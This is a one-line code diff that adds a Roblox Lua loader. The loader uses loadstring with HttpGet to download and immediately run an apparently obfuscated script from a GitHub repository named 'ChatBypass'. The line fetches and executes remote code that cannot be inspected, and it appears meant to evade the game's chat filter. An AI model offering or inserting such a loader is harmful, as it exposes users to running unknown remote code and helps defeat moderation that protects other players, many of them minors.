@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/luascriptsROBLOX/ChatBypass/main/Protected_6033964430049258.txt"))()
